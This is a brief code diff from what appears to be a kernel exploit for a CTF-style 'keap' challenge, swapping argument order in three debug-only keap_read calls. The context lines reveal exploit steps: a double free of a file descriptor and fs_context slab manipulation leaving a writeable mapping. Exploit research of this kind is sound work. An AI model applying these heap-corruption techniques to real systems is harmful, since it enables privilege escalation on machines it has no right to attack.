@@ -56,7 +56,7 @@ int main(void)
 
   puts("[+] Free one of the FDs via double free keap");
   #ifdef DEBUG
-  keap_read(buf, keap_ptr, FS_CONTEXT_SLAB_SIZE);
+  keap_read(keap_ptr, buf, FS_CONTEXT_SLAB_SIZE);
   print_hex(buf, FS_CONTEXT_SLAB_SIZE); 
   #endif
   keap_free(keap_ptr);
@@ -83,7 +83,7 @@ int main(void)
   }
 
   #ifdef DEBUG
-  keap_read(buf, keap_ptr, FS_CONTEXT_SLAB_SIZE);
+  keap_read(keap_ptr, buf, FS_CONTEXT_SLAB_SIZE);
   print_hex(buf, FS_CONTEXT_SLAB_SIZE); 
   #endif
 
@@ -111,7 +111,7 @@ int main(void)
   }
   // After: 2 fd 1 refcount (but writeable due to mmap)
   #ifdef DEBUG
-  keap_read(buf, keap_ptr, FS_CONTEXT_SLAB_SIZE);
+  keap_read(keap_ptr, buf, FS_CONTEXT_SLAB_SIZE);
   print_hex(buf, FS_CONTEXT_SLAB_SIZE); 
   #endif
 
